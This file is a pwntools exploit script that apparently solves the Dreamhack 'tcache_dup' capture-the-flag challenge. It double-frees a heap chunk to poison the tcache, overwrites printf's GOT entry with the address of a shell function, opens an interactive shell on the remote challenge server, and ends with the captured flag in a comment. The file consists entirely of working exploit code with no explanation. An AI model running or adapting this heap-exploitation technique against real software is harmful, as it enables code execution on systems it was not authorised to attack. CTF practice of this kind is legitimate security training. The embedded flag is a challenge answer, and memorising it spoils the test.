from pwn import * 

def make(size,data):
    p.sendlineafter(">",str(1))
    p.sendlineafter("Size:",str(size))
    p.sendlineafter("Data:",data)

def Del(idx):
    p.sendlineafter(">",str(2))
    p.sendlineafter("idx:",str(idx))

shell = 0x400ab0
printf_got = 0x601038

# p = process("./tcache_dup")
p = remote("host1.dreamhack.games",8498)

make(0x10,"a"*8)

Del(0)
Del(0)

make(0x10,p64(printf_got))
make(0x10,"a"*8)
pause()
make(0x10,p64(shell))

p.interactive()

#DH{11203ceeb905ad94be39c7a1e3b6a540}


